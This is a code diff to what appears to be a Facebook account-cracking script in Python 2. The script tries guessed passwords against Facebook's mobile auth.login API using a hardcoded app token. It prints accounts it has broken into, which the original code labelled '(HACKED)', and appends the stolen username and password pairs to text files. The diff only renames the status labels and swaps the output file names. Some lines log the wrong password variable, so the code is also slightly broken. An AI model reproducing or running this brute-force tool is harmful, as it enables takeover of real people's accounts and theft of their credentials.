@@ -177,14 +177,14 @@ def act():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
-                okb = open('sdcard/ids/Checkpoint.txt', 'a')
+                print '\x1b[1;93m   (MALIK\x1b[1;92m_OK)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
+                okb = open('sdcard/ids/Successful.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
-                cps = open('sdcard/ids/Successful.txt', 'a')
+                print '\x1b[1;92m   (MALIK\x1b[1;97m_Checkpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
+                cps = open('sdcard/ids/Checkpoint.txt', 'a')
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
                 cpb.append(c + user + pass1)
@@ -193,14 +193,14 @@ def act():
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
-                    okb = open('sdcard/ids/Checkpoint.txt', 'a')
+                    print '\x1b[1;93m   (MALIK\x1b[1;92m_OK)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
+                    okb = open('sdcard/ids/Successful.txt', 'a')
                     okb.write(k + c + user + pass2 + '\n')
                     okb.close()
                     oks.append(c + user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
-                    cps = open('sdcard/ids/Successful.txt', 'a')
+                    print '\x1b[1;92m   (MALIK\x1b[1;97m_CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
+                    cps = open('sdcard/ids/Checkpoint.txt', 'a')
                     cps.write(k + c + user + pass3 + '\n')
                     cps.close()
                     cpb.append(c + user + pass3)
@@ -209,14 +209,14 @@ def act():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
-                        okb = open('sdcard/ids/Checkpoint.txt', 'a')
+                        print '\x1b[1;93m   (MALIK\x1b[1;92m_OK)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
+                        okb = open('sdcard/ids/Successful.txt', 'a')
                         okb.write(k + c + user + pass3 + '\n')
                         okb.close()
                         oks.append(c + user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
-                        cps = open('sdcard/ids/Successful.txt', 'a')
+                        print '\x1b[1;92m   (MALIK\x1b[1;97m_CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
+                        cps = open('sdcard/ids/Checkpoint.txt', 'a')
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
                         cpb.append(c + user + pass3)
@@ -285,14 +285,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
-                okb = open('sdcard/ids/Checkpoint.txt', 'a')
+                print '\x1b[1;93m   (MALIK\x1b[1;92m_OK)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
+                okb = open('sdcard/ids/Successful.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
-                cps = open('sdcard/ids/Successful.txt', 'a')
+                print '\x1b[1;92m   (MALIK\x1b[1;97m_CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
+                cps = open('sdcard/ids/Checkpoint.txt', 'a')
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
                 cpb.append(c + user + pass1)
@@ -301,14 +301,14 @@ def action():
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
-                    okb = open('sdcard/ids/Checkpoint.txt', 'a')
+                    print '\x1b[1;93m   (MALIK\x1b[1;92m_OK)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
+                    okb = open('sdcard/ids/Successful.txt', 'a')
                     okb.write(k + c + user + pass2 + '\n')
                     okb.close()
                     oks.append(c + user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
-                    cps = open('sdcard/ids/Successful.txt', 'a')
+                    print '\x1b[1;92m   (MALIK\x1b[1;97m_CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
+                    cps = open('sdcard/ids/Checkpoint.txt', 'a')
                     cps.write(k + c + user + pass3 + '\n')
                     cps.close()
                     cpb.append(c + user + pass3)
@@ -317,14 +317,14 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
-                        okb = open('sdcard/ids/Checkpoint.txt', 'a')
+                        print '\x1b[1;93m   (MALIK\x1b[1;92m_OK)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
+                        okb = open('sdcard/ids/Successful.txt', 'a')
                         okb.write(k + c + user + pass3 + '\n')
                         okb.close()
                         oks.append(c + user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
-                        cps = open('sdcard/ids/Successful.txt', 'a')
+                        print '\x1b[1;92m   (MALIK\x1b[1;97m_CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
+                        cps = open('sdcard/ids/Checkpoint.txt', 'a')
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
                         cpb.append(c + user + pass3)
@@ -333,14 +333,14 @@ def action():
                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print '\x1b[1;93m   (HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass4
-                            okb = open('sdcard/ids/Checkpoint.txt', 'a')
+                            print '\x1b[1;93m   (MALIK\x1b[1;92m_OK)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass4
+                            okb = open('sdcard/ids/Successful.txt', 'a')
                             okb.write(k + c + user + pass4 + '\n')
                             okb.close()
                             oks.append(c + user + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;92m   (Check\x1b[1;97mpoint\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass4
-                            cps = open('sdcard/ids/Successful.txt', 'a')
+                            print '\x1b[1;92m   (MALIK\x1b[1;97m_CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass4
+                            cps = open('sdcard/ids/Checkpoint.txt', 'a')
                             cps.write(k + c + user + pass4 + '\n')
                             cps.close()
                             cpb.append(c + user + pass4)
